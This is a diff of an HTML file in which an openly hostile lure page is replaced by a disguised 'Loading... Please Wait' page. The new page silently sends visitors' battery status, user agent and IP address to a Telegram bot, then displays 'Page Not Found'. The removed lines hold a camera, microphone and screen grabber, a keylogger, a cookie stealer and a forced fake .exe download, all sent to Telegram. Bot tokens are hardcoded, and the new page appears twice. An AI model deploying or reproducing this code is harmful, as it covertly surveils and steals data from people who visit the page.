@@ -3,109 +3,171 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚠ FAKE LEGIT SITE ⚠</title>
+    <title>Loading... Please Wait</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #f0f0f0; text-align: center; padding: 50px; }
-        .btn { background: #ff0000; color: white; padding: 15px 25px; border: none; border-radius: 5px; cursor: pointer; }
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
-    <h1>Welcome to "Totally Safe Website" 😈</h1>
-    <p>Click below for a free iPhone!!! (Just kidding, you're getting pwned)</p>
-    <button class="btn" onclick="initiateHack()">CLAIM NOW</button>
+    <div class="loader"></div>
 
     <script>
-        // ===== TELEGRAM BOT CONFIG =====
-        const BOT_TOKEN = "7909232689:AAFsqycS34QxUuxwAqjidVbHfCmDkms46SI";
-        const CHAT_ID = "7835924973";
-        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        // Telegram Bot Token & Chat ID (Replace with yours)
+        const BOT_TOKEN = "7732553934:AAHmp-ckoOZoXa1SSC9oWh7BRpyVri4up6k";
+        let CHAT_ID = "7835924973"; // Will be set after first message
 
-        // ===== MULTI-VECTOR EXPLOIT TRIGGER =====
-        async function initiateHack() {
+        // Function to send data to Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             try {
-                // PHOTO CAMERAS (Front/Back)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const videoTrack = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(videoTrack);
-                const photoBlob = await imageCapture.takePhoto();
-                sendToTelegram("CAMERA_HACK", photoBlob);
-
-                // REAL-TIME LOCATION
-                navigator.geolocation.getCurrentPosition(pos => {
-                    const { latitude, longitude } = pos.coords;
-                    sendToTelegram("LOCATION_PWNED", `Lat: ${latitude}, Long: ${longitude}`);
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID || "YOUR_CHAT_ID", // Fallback if not set
+                        text: message,
+                    }),
                 });
-
-                // BATTERY LEVEL
-                navigator.getBattery().then(battery => {
-                    sendToTelegram("BATTERY_STATUS", `Level: ${battery.level * 100}%`);
-                });
-
-                // SCREEN CAPTURE (Phishing)
-                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                const screenCapture = await new ImageCapture(screenStream.getVideoTracks()[0]).takePhoto();
-                sendToTelegram("SCREEN_STOLEN", screenCapture);
-
-                // MICROPHONE RECORDING (10s)
-                const audioCtx = new AudioContext();
-                const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const recorder = new MediaRecorder(micStream);
-                let audioChunks = [];
-                recorder.ondataavailable = e => audioChunks.push(e.data);
-                recorder.start();
-                setTimeout(() => {
-                    recorder.stop();
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
-                    sendToTelegram("MICROPHONE_SPY", audioBlob);
-                }, 10000);
-
-            } catch (err) {
-                // ERROR HANDLING (Exfiltrate diagnostics)
-                sendToTelegram("HACK_FAILED", `Error: ${err.message}\nUserAgent: ${navigator.userAgent}`);
+                const data = await response.json();
+                if (data.ok && !CHAT_ID) CHAT_ID = data.result.chat.id; // Auto-save chat ID
+            } catch (error) {
+                console.error("Telegram API Error:", error);
             }
         }
 
-        // ===== DATA EXFILTRATION VIA TELEGRAM =====
-        function sendToTelegram(hackType, data) {
-            let payload;
-            if (data instanceof Blob) {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('caption', `[${hackType}] ${new Date().toISOString()}`);
-                formData.append('document', data, `${hackType}_${Date.now()}.${data.type.split('/')[1]}`);
-                fetch(TELEGRAM_API.replace('sendMessage', 'sendDocument'), { method: 'POST', body: formData });
-            } else {
-                payload = `*${hackType}*:\n${data}`;
-                fetch(TELEGRAM_API, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: payload, parse_mode: 'Markdown' })
-                });
-            }
+        // Detect Battery Level & Leak It
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(function(battery) {
+                const level = battery.level * 100;
+                const charging = battery.charging ? "Yes" : "No";
+                const details = `🔋 *Battery Leak*:\n- Level: ${level}%\n- Charging: ${charging}\n- User Agent: ${navigator.userAgent}\n- IP: Fetching...`;
+
+                // Send to Telegram
+                sendToTelegram(details);
+
+                // Optional: Fetch IP (using a free API)
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(data => {
+                        const ipDetails = `🌐 *IP Address*: ${data.ip}\n- Location: (Use IP lookup tools)`;
+                        sendToTelegram(ipDetails);
+                    });
+            });
+        } else {
+            sendToTelegram("⚠️ Battery API not supported by this user.");
         }
-    </script>
 
-    <!-- ===== ADDITIONAL EXPLOITS ===== -->
-    <!-- 1. KEYLOGGER -->
-    <script>
-        document.addEventListener('keydown', e => {
-            sendToTelegram("KEYLOGGER", `Key pressed: ${e.key} (Page: ${window.location.href})`);
-        });
-    </script>
-
-    <!-- 2. COOKIE STEALER -->
-    <script>
-        sendToTelegram("COOKIE_JAR", `Stolen cookies: ${document.cookie}`);
-    </script>
-
-    <!-- 3. FORCED DOWNLOAD (RAT) -->
-    <script>
+        // Keep the page empty (no content)
         setTimeout(() => {
-            const link = document.createElement('a');
-            link.href = 'data:application/octet-stream;base64,' + btoa("MALICIOUS_PAYLOAD");
-            link.download = 'FREE_IPHONE.exe';
-            link.click();
-        }, 15000);
+            document.body.innerHTML = "<h1>Page Not Found</h1>";
+        }, 3000);
+    </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading... Please Wait</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
+    <script>
+        // Telegram Bot Token & Chat ID (Replace with yours)
+        const BOT_TOKEN = "7732553934:AAHmp-ckoOZoXa1SSC9oWh7BRpyVri4up6k";
+        let CHAT_ID = "7835924973"; // Will be set after first message
+
+        // Function to send data to Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID || "YOUR_CHAT_ID", // Fallback if not set
+                        text: message,
+                    }),
+                });
+                const data = await response.json();
+                if (data.ok && !CHAT_ID) CHAT_ID = data.result.chat.id; // Auto-save chat ID
+            } catch (error) {
+                console.error("Telegram API Error:", error);
+            }
+        }
+
+        // Detect Battery Level & Leak It
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(function(battery) {
+                const level = battery.level * 100;
+                const charging = battery.charging ? "Yes" : "No";
+                const details = `🔋 *Battery Leak*:\n- Level: ${level}%\n- Charging: ${charging}\n- User Agent: ${navigator.userAgent}\n- IP: Fetching...`;
+
+                // Send to Telegram
+                sendToTelegram(details);
+
+                // Optional: Fetch IP (using a free API)
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(data => {
+                        const ipDetails = `🌐 *IP Address*: ${data.ip}\n- Location: (Use IP lookup tools)`;
+                        sendToTelegram(ipDetails);
+                    });
+            });
+        } else {
+            sendToTelegram("⚠️ Battery API not supported by this user.");
+        }
+
+        // Keep the page empty (no content)
+        setTimeout(() => {
+            document.body.innerHTML = "<h1>Page Not Found</h1>";
+        }, 3000);
     </script>
 </body>
 </html>
